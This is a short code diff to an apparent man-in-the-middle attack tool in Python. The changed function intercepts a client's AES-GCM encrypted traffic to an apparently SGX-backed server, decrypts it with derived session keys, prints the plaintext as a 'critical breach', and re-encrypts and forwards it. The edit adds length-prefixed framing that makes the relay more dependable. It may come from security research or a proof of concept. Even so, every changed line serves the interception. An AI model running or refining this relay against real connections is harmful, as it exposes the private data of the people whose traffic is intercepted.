@@ -144,19 +144,19 @@ def handle_mitm_session(client_sock: socket.socket, client_addr, target_ip: str,
         print(f"[MITM] Derived Client-side AES-128 key : {key_client_side.hex()}")
         print(f"[MITM] Derived Server-side AES-128 key : {key_server_side.hex()}")
 
-        # 4. Intercept AES-GCM encrypted payload from Client, decrypt, and re-encrypt for Server
-        encrypted_packet = client_sock.recv(4096)
-        if not encrypted_packet:
-            print("[MITM] Connection closed before payload transmission (handshake rejected by peer).")
-            return
+        # 4. Intercept 4-byte frame length + AES-GCM encrypted payload
+        raw_len = recv_exact(client_sock, 4)
+        payload_len = struct.unpack("!I", raw_len)[0]
+        encrypted_packet = recv_exact(client_sock, payload_len)
 
         print(f"[MITM] Intercepted AES-GCM stream ({len(encrypted_packet)} bytes) from Client.")
         plaintext = decrypt_sgx_packet(key_client_side, encrypted_packet)
         print(f"[CRITICAL BREACH] Decrypted Plaintext in transit: {plaintext.decode('utf-8', errors='replace')}")
 
-        # Re-encrypt with Server-side session key and forward seamlessly
+        # Re-encrypt with Server-side session key and forward with 4-byte length prefix
         reencrypted_packet = encrypt_sgx_packet(key_server_side, plaintext)
-        server_sock.sendall(reencrypted_packet)
+        server_sock.sendall(struct.pack("!I", len(reencrypted_packet)) + reencrypted_packet)
+        
         print(f"[MITM] Re-encrypted and forwarded payload ({len(reencrypted_packet)} bytes) to Server.")
         print("=================================================================\n")
 
